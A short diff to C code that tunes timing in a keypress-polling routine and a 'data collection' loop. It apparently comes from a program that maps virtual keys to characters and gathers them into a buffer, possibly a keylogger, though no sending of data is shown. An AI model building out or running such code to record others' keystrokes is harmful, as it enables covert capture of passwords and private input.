@@ -44,6 +44,7 @@ static bool is_any_key_pressed(char *key_pressed)
             if (mapped > 0)
             {
                 *key_pressed = (char)(mapped); // Virtual Key to ASCII
+                sleep_ms(50);
                 return true;
             }
         }
@@ -127,7 +128,7 @@ void get_data(char *buffer, size_t max_size)
             }
         }
 
-        sleep_ms(75);
+        sleep_ms(50);
     }
 
     LOG("Data collection finished. Total size: %zu", current_size);
